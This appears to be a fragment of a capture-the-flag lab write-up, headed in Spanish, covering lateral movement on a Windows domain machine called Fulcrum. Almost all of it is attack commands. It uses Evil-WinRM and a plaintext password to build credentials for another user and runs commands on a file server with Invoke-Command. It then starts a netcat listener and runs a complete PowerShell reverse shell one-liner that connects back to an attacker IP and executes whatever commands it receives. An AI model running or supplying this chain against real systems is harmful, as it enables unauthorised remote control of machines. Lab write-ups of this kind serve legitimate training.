
### EJECUCIÓN DE COMANDOS WINRM(USER:LDAP) --> OTHR COMPUTER(USER:BTables)
```shell
*Evil-WinRM* PS C:\inetpub\wwwroot> $password = ConvertTo-SecureString '++FileServerLogon12345++' -AsPlainText -Force
*Evil-WinRM* PS C:\inetpub\wwwroot> $Cred = New-Object System.Management.Automation.PSCredential('FULCRUM\BTables',$password)
*Evil-WinRM* PS C:\inetpub\wwwroot> Invoke-Command -ComputerName file.fulcrum.local -Credential $Cred -ScriptBlock {whoami}
fulcrum\btables


#MAQUINA LOCAL
❯ sudo rlwrap nc -nlvp 53

#MAQUINA VICTIMA
*Evil-WinRM* PS C:\inetpub\wwwroot> Invoke-Command -ComputerName file.fulcrum.local -Credential $Cred -ScriptBlock {$client = New-Object System.Net.Sockets.TCPClient('10.10.16.5',53);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()}
```